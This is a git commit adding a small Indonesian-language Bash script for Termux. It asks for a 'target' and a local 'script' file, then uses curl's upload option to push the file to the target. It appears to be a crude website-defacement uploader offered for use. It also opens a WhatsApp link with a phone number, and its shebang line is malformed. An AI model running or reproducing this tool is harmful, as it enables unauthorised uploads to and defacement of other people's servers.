3d069f87068c984591ea2d4e96b83d920f950587
WhoMHw <71681090+WhoMHw@users.noreply.github.com>
2020-10-17 19:08:17 +0700

    Add files via upload

---
+++ MHWA.sh
@@ -0,0 +1,29 @@
+!/bin/bash
+#toolsMHw
+
+echo "========================================================================"
+echo "              _________Author:WhoMHw__________                          "
+echo "                                                                        "
+echo "========================================================================"
+
+echo "hallo kaka,siapa nama kaka"? #tulisan keluar
+read nick #membaca seng ditulis
+clear
+echo "selamat datang kaka" $nick
+echo "ini hanyalah tools yang dibuat oleh orang gabut doank"
+sleep 2
+termux-open https://wa.me/+6285336515046
+echo "langsung aja kaka"
+echo "masukkan nama target :"
+read target
+echo "masukkan script kamu:"
+read file
+echo "tunggu bentar ya kaka proses upload script lu....."
+ curl -T /storage/emulated/0/$file $target
+echo "makasih kaka udah menggunakan tools ini"
+echo "==========================================="
+echo "  Thank you :Mr.WR.py                     "
+echo "  Thank you :Malikat Tak Bersayap          "
+echo "____________Makasih semua__________________"
+echo "==========================================="
+echo "WhoMHw"
